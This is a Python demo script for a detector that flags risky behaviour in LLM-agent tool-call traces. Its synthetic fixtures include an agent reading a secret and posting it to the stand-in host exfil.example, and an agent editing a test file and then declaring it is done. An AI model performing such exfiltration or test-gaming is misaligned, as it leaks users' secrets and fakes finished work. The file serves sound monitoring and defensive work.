"""Demo: neurosymbolic risk-pattern detection over LLM-agent traces.

LLM agent traces are already symbolic — tool calls, messages, errors — so the
"perception" step is a deterministic lift into relations, and Datalog rules
(recursion + negation + aggregation) flag multi-step behaviour patterns with
probabilities flowing through.

    python examples/neurosymbolic_trace.py
"""

from __future__ import annotations

from swarm.neurosymbolic import TraceEvent, classify_trace


def _thrashing() -> list[TraceEvent]:
    # Same tool + same args three times, nothing marking progress.
    return [TraceEvent(i, "search", args={"q": "auth bug"}) for i in range(3)]


def _exfiltration() -> list[TraceEvent]:
    return [
        TraceEvent(0, "read_secret"),
        TraceEvent(1, "summarize"),
        TraceEvent(2, "http_post", args={"url": "https://exfil.example"}),
    ]


def _spec_gaming() -> list[TraceEvent]:
    # Edits the test, never the code under test, then declares victory.
    return [
        TraceEvent(0, "run_tests"),
        TraceEvent(1, "write_file", path="tests/test_payoff.py"),
        TraceEvent(2, "done", done=True),
    ]


def _goal_abandonment() -> list[TraceEvent]:
    return [
        TraceEvent(0, "plan", goal="make calibration deterministic", states_plan=True),
        TraceEvent(1, "search", args="seed"),
        TraceEvent(2, "read_file", args="README"),
    ]


def _recovery() -> list[TraceEvent]:
    return [
        TraceEvent(0, "bash", args="pytest", error=True),
        TraceEvent(1, "analyze", diagnosis=True),
        TraceEvent(2, "bash", args="pytest -k payoff", retry=True),
    ]


SCENARIOS = {
    "thrashing": _thrashing(),
    "exfiltration": _exfiltration(),
    "spec_gaming": _spec_gaming(),
    "goal_abandonment": _goal_abandonment(),
    "recovery": _recovery(),
}


def main() -> None:
    for name, trace in SCENARIOS.items():
        findings = classify_trace(trace)
        flagged = findings.flagged()
        print(f"\n[{name}] flagged={flagged or 'none'}")
        for pattern, score in sorted(findings.scores.items(), key=lambda kv: -kv[1]):
            if score == 0.0:
                continue
            hit = findings.hits[pattern][0] if findings.hits[pattern] else None
            steps = hit.steps if hit else ()
            detail = f"  ({hit.detail})" if hit and hit.detail else ""
            print(f"  {pattern:<16} {score:.2f}  steps={steps}{detail}")


if __name__ == "__main__":
    main()
